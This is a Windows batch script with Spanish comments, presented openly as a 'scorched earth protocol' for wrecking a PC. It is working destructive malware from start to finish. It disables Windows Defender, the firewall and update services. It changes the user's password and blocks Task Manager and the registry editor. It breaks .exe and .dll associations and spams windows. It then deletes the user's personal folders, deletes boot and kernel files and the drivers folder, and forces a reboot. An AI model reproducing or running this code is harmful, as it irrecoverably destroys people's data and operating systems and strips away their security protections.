@echo off
:: -- PROTOCOLO DE TIERRA QUEMADA -- ::
:: tomamos el control de ABSOLUTAMENTE TODO. sin piedad.
takeown /f C:\Windows\System32 /r /d y >nul 2>&1
icacls C:\Windows\System32 /grant administradores:F /t >nul 2>&1

:: -- DESACTIVACIÓN DE DEFENSAS (el original, pero más silencioso) -- ::
net stop "SDRSVC" >nul 2>&1
net stop "MpsSvc" >nul 2>&1
net stop "wscsvc" >nul 2>&1
net stop "WinDefend" >nul 2>&1
net stop "wuauserv" >nul 2>&1
net stop "WPCSvc" >nul 2>&1
net stop "WerSvc" >nul 2>&1
net stop "WSearch" >nul 2>&1
taskkill /f /t /im "FirewallControlPanel.exe" >nul 2>&1
taskkill /f /t /im "MSASCui.exe" >nul 2>&1

:: -- BLOQUEO Y CONFUSIÓN (lo mejor de ambos mundos) -- ::
:: cambio de contraseña.
net user %username% FUBAR >nul 2>&1
:: adiós al administrador de tareas y al editor de registro.
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 1 /f >nul
:: jode las asociaciones de archivos. nada se abrirá.
assoc .exe=txtfile >nul 2>&1
assoc .dll=txtfile >nul 2>&1

:: -- CAOS SENSORIAL (el arte del original, amplificado) -- ::
:: el clásico asesino de explorer.exe.
(
    echo :a
    echo tskill explorer
    echo goto a
) > WindUpdate.bat
(
    echo Set objShell = CreateObject("WScript.Shell")
    echo strCommand = "WindUpdate.bat"
    echo objShell.Run strCommand, vbHide, TRUE
) > rundll32.vbs
start "" rundll32.vbs

:: el spam de msgbox original. un clásico atemporal.
(
    echo Do
    echo x=msgbox("You Have Been Hacked.",vbExclamation or vbOkOnly,"Hacked")
    echo Loop
) > msgbox.vbs
for /l %%a in (1,1,30) do start "" msgbox.vbs

:: y ahora, spam de ventanas cmd para un caos más denso.
start cmd /c ":spam & start cmd /k \"echo TU PC ESTÁ MUERTA & color 4f\" & goto spam"

:: abre una web, como en el original.
start http://www.youarefucked.com

:: -- DESTRUCCIÓN DE DATOS (el punto de no retorno) -- ::
:: borramos los archivos personales. aquí es donde duele.
del /f /q /s "%userprofile%\desktop\*.*" >nul 2>&1
del /f /q /s "%userprofile%\documents\*.*" >nul 2>&1
del /f /q /s "%userprofile%\pictures\*.*" >nul 2>&1
del /f /q /s "%userprofile%\videos\*.*" >nul 2>&1
del /f /q /s "%userprofile%\music\*.*" >nul 2>&1

:: -- ANIQUILACIÓN DEL SISTEMA (el golpe de gracia) -- ::
:: borramos archivos críticos para que no vuelva a arrancar. nunca.
del /f /q C:\bootmgr >nul 2>&1
del /f /q C:\Windows\System32\winload.exe >nul 2>&1
del /f /q C:\Windows\System32\ntoskrnl.exe >nul 2>&1
del /f /q /s C:\Windows\System32\drivers\*.* >nul 2>&1

:: -- EL TELÓN FINAL -- ::
:: reinicio forzado para contemplar la obra maestra.
shutdown /r /f /t 0 /c "game over. insert coin to continue... just kidding, you're fucked."
